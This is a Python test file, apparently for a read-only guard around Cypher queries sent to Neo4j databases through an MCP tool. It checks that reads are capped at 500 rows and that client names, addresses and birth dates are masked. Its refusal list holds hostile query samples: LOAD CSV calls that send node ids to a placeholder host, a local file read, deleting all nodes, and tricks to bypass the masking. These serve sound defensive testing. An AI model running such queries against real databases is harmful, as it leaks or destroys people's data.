"""N-22：読み取りの包みを、起動した二つの DB の EXPLAIN と実行で確かめる。NEST_LIVE_DB=1 のときだけ。

手本：tsunagu-net d8e6e2d の tests/test_integration_mcp_resource.py の例（読むだけ）。
LOAD CSV の URL は存在しない名前（.invalid）なので、万一通っても外へは届かない。拒否の例は本体を流さない（EXPLAIN だけ）。
"""
import os
import uuid

import pytest

pytestmark = pytest.mark.skipif(os.environ.get("NEST_LIVE_DB") != "1", reason="NEST_LIVE_DB=1 のときだけ")

from tests.test_gate_write_live import admin, driver  # noqa: E402,F401  フィクスチャ（個人の側）

REFUSED = [
    "LOAD CSV FROM 'http://example.invalid/x.csv' AS r RETURN r",
    "LOAD CSV WITH HEADERS FROM 'file:///x.csv' AS r RETURN r.a",
    "MATCH (n) WITH n LIMIT 1 LOAD CSV FROM 'https://example.invalid/' + toString(id(n)) AS r RETURN r",
    "CALL db.info()",
    "CALL dbms.components()",
    "CALL db.info() YIELD name RETURN name",
    "CREATE INDEX probe_idx IF NOT EXISTS FOR (n:Probe) ON (n.x)",
    "DROP CONSTRAINT Record_recordId_unique IF EXISTS",
    "CREATE (n:Probe) RETURN n",
    "MATCH (n) DETACH DELETE n",
    "EXPLAIN MATCH (n) RETURN n",
    "",
]

ALLOWED = [
    "MATCH (n) RETURN count(n) AS n",
    "CALL db.labels()",
    "CALL db.relationshipTypes() YIELD relationshipType RETURN relationshipType",
    "CALL db.propertyKeys()",
    "CALL { MATCH (n) RETURN n } RETURN count(n) AS n",
]


@pytest.fixture(scope="module")
def resource():
    from nest import connections
    with connections.driver("resource") as d:
        yield d


@pytest.mark.parametrize("side", ["personal", "resource"])
@pytest.mark.parametrize("query", REFUSED)
def test_refused_on_the_real_db(driver, resource, side, query):
    from nest import mcp_guard
    with pytest.raises(mcp_guard.NotReadOnly):
        mcp_guard.check_read_only(driver if side == "personal" else resource, query, {}, personal=side == "personal")


@pytest.mark.parametrize("side", ["personal", "resource"])
@pytest.mark.parametrize("query", ALLOWED)
def test_allowed_on_the_real_db(driver, resource, side, query):
    from nest import mcp_guard
    d = driver if side == "personal" else resource
    assert mcp_guard.check_read_only(d, query, {}, personal=side == "personal") == query


@pytest.mark.parametrize("side", ["personal", "resource"])
def test_rows_stop_at_500(driver, resource, side):
    from nest import mcp_guard
    rows = mcp_guard.run_read(driver if side == "personal" else resource, "UNWIND range(1, 600) AS i RETURN i", {},
                              personal=side == "personal")
    assert len(rows) == 500 and rows[-1] == {"i": 500}


def test_personal_results_do_not_carry_names_address_or_birth_date(driver, admin):
    from nest import mcp_guard
    from nest.gate import write as gw
    mark = uuid.uuid4().hex[:8]
    out = gw.submit({"requestId": "req-" + uuid.uuid4().hex, "actorStaffId": admin,
                     "nodes": [{"ref": "c", "label": "Client", "origin": "Human",
                                "properties": {"familyName": "架空" + mark, "givenName": "太郎", "birthDate": "2000-01-02"}},
                               {"ref": "r", "label": "Residence", "origin": "Human",
                                "properties": {"address": "福岡県北九州市小倉北区架空町1-2-3 " + mark, "certainty": "Confirmed",
                                               "since": "2020-04-01"}}],
                     "relationships": [{"type": "RESIDES_AT", "from": "c", "to": "r", "properties": {}}]}, driver)
    assert out["ok"], out["errors"]
    rows = mcp_guard.run_read(driver, "MATCH (c:Client {clientId: $id})-[:RESIDES_AT]->(r:Residence) "
                                      "RETURN c, r, c.displayCode AS code, [c, r] AS both", {"id": out["ids"]["c"]}, personal=True)
    text = repr(rows)
    assert mark not in text and "太郎" not in text and "2000-01-02" not in text
    assert rows[0]["code"].startswith("C-")
    assert rows[0]["r"]["areaCode"] == "401064" and rows[0]["r"]["since"] == "2020-04-01"
    for bad in ("MATCH (c:Client {clientId: $id}) RETURN toUpper(c.familyName) AS x",
                "MATCH (c:Client {clientId: $id}) RETURN c['family' + 'Name'] AS x",
                "MATCH (c:Client {clientId: $id}) RETURN properties(c) AS x"):
        with pytest.raises(mcp_guard.NotReadOnly):
            mcp_guard.run_read(driver, bad, {"id": out["ids"]["c"]}, personal=True)
